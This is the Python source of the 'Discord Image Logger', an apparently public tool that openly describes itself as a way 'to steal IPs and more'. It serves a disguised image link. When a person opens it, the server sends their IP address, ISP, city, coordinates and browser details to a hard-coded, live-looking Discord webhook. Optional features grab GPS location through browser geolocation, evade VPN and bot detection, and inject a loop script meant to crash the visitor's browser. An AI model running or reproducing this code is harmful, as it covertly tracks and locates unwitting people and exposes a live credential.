# Discord Image Logger
# By DeKrypt | https://github.com/dekrypted

from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.0"
__author__ = "DeKrypt"

config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1152675299524346066/1xolv240jxLOCADC9fE7wz7y3YjyrOTnya63ef72eGDbxHqMji4-QyRZkUcYrtYnlES3",
    "image": "https://static.wikia.nocookie.net/ordemparanormal/images/4/41/Miniatura_Bilu_em_Sinais_do_Outro_Lado.png/revision/latest/scale-to-width-down/350?cb=20221219182934&path-prefix=pt-br", # You can also have a custom image by using a URL argument
                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)

    # CUSTOMIZATION #
    "username": "Yoshi Image Logger", # Set this to the name you want the webhook to have
    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)

    # OPTIONS #
    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
    
    "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.

    "message": { # Show a custom message when the user opens the image
        "doMessage": True, # Enable the custom message?
        "message": "É... TO COM TEU IP", # Message to show
        "richMessage": True, # Enable rich text? (See README for more info)
    },

    "vpnCheck": 1, # Prevents VPNs from triggering the alert
                # 0 = No Anti-VPN
                # 1 = Don't ping when a VPN is suspected
                # 2 = Don't send an alert when a VPN is suspected

    "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
    "buggedImage": False, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)

    "antiBot": 1, # Prevents bots from triggering the alert
                # 0 = No Anti-Bot
                # 1 = Don't ping when it's possibly a bot
                # 2 = Don't ping when it's 100% a bot
                # 3 = Don't send an alert when it's possibly a bot
                # 4 = Don't send an alert when it's 100% a bot
    

    # REDIRECTION #
    "redirect": {
        "redirect": True, # Redirect to a webpage?
        "page": "data:image/jpeg;base64,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" # Link to the webpage to redirect to 
    },

    # Please enter all values in correct format. Otherwise, it may break.
    # Do not edit anything below this, unless you know what you're doing.
    # NOTE: Hierarchy tree goes as follows:
    # 1) Redirect (If this is enabled, disables image and crash browser)
    # 2) Crash Browser (If this is enabled, disables image)
    # 3) Message (If this is enabled, disables image)
    # 4) Image 
}

blacklistedIPs = ("27", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
                                                           # This feature is undocumented mainly due to it being for detecting bots better.

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "@everyone",
    "embeds": [
        {
            "title": "Yoshi Image Logger - Error",
            "color": config["color"],
            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
        }
    ],
})

def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
    if ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    
    if bot:
        requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "",
    "embeds": [
        {
            "title": "Yoshi Image Logger - Link Sent",
            "color": config["color"],
            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
        }
    ],
}) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
        return

    ping = "@everyone"

    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    if info["proxy"]:
        if config["vpnCheck"] == 2:
                return
        
        if config["vpnCheck"] == 1:
            ping = ""
    
    if info["hosting"]:
        if config["antiBot"] == 4:
            if info["proxy"]:
                pass
            else:
                return

        if config["antiBot"] == 3:
                return

        if config["antiBot"] == 2:
            if info["proxy"]:
                pass
            else:
                ping = ""

        if config["antiBot"] == 1:
                ping = ""


    os, browser = httpagentparser.simple_detect(useragent)
    
    embed = {
    "username": config["username"],
    "content": ping,
    "embeds": [
        {
            "title": "Yoshi Image Logger - IP Logged",
            "color": config["color"],
            "description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`
            
**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
> **City:** `{info['city'] if info['city'] else 'Unknown'}`
> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
> **Mobile:** `{info['mobile']}`
> **VPN:** `{info['proxy']}`
> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`

**PC Info:**
> **OS:** `{os}`
> **Browser:** `{browser}`

**User Agent:**
```
{useragent}
```""",
    }
  ],
}
    
    if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
    requests.post(config["webhook"], json = embed)
    return info

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
    # This IS NOT a rat or virus, it's just a loading image. (Made by me! :D)
    # If you don't trust it, read the code or don't use this at all. Please don't make an issue claiming it's duahooked or malicious.
    # You can look at the below snippet, which simply serves those bytes to any client that is suspected to be a Discord crawler.
}

class ImageLoggerAPI(BaseHTTPRequestHandler):
    
    def handleRequest(self):
        try:
            if config["imageArgument"]:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                if dic.get("url") or dic.get("id"):
                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                else:
                    url = config["image"]
            else:
                url = config["image"]

            data = f'''<style>body {{
margin: 0;
padding: 0;
}}
div.img {{
background-image: url('{url}');
background-position: center center;
background-repeat: no-repeat;
background-size: contain;
width: 100vw;
height: 100vh;
}}</style><div class="img"></div>'''.encode()
            
            if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
                return
            
            if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
                self.send_response(200 if config["buggedImage"] else 302) # 200 = OK (HTTP Status)
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["buggedImage"]: self.wfile.write(binaries["loading"]) # Write the image to the client.

                makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url)
                
                return
            
            else:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))

                if dic.get("g") and config["accurateLocation"]:
                    location = base64.b64decode(dic.get("g").encode()).decode()
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0], url = url)
                else:
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint = s.split("?")[0], url = url)
                

                message = config["message"]["message"]

                if config["message"]["richMessage"] and result:
                    message = message.replace("{ip}", self.headers.get('x-forwarded-for'))
                    message = message.replace("{isp}", result["isp"])
                    message = message.replace("{asn}", result["as"])
                    message = message.replace("{country}", result["country"])
                    message = message.replace("{region}", result["regionName"])
                    message = message.replace("{city}", result["city"])
                    message = message.replace("{lat}", str(result["lat"]))
                    message = message.replace("{long}", str(result["lon"]))
                    message = message.replace("{timezone}", f"{result['timezone'].split('/')[1].replace('_', ' ')} ({result['timezone'].split('/')[0]})")
                    message = message.replace("{mobile}", str(result["mobile"]))
                    message = message.replace("{vpn}", str(result["proxy"]))
                    message = message.replace("{bot}", str(result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result["hosting"] else 'False'))
                    message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent'))[1])
                    message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent'))[0])

                datatype = 'text/html'

                if config["message"]["doMessage"]:
                    data = message.encode()
                
                if config["crashBrowser"]:
                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>' # Crasher code by me! https://github.com/dekrypted/Chromebook-Crasher

                if config["redirect"]["redirect"]:
                    data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
                self.send_response(200) # 200 = OK (HTTP Status)
                self.send_header('Content-type', datatype) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["accurateLocation"]:
                    data += b"""<script>
var currenturl = window.location.href;

if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (coords) {
    if (currenturl.includes("?")) {
        currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    } else {
        currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    }
    location.replace(currenturl);});
}}

</script>"""
                self.wfile.write(data)
        
        except Exception:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()

            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
            reportError(traceback.format_exc())

        return
    
    do_GET = handleRequest
    do_POST = handleRequest

handler = app = ImageLoggerAPI
